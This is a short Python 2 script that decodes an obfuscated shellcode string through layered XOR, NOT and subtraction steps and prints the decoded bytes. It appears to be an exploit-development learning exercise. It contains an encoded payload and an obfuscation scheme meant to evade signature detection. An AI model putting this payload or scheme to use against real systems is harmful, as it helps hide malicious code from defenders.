#!/usr/bin/python

# Python custom decoder 

shellcode = ("\x0d\x12\x62\x7a\x03\x03\x57\x7a\x7a\x03\x7c\x45\x48\xa5\xc7\x62\xa5\xfc\x77\xa5\xfd\x82\x2f\xe9\xd2")
decoded = ""
decoded2 = ""

print 'Decoded shellcode ...'

for x in bytearray(shellcode) :
	x = x^0xA9 # xor decode x with 0xA9
	x = ~x # not decode x
	x = x & 0xff # make the not decoded x positive
	x = x^0xCC # xor decode x with 0xCC
	x = x - 0x0A # subtract 10 from x
	x = x^0xBB # xor decode x with 0xBB
	x = x - 0x05 # subtract 5 from x
	
	decoded += '\\x'
	decoded += '%02x' % x

	decoded2 += '0x'
	decoded2 += '%02x,' %x

print decoded
print decoded2
print 'Len: %d' % len(bytearray(shellcode))
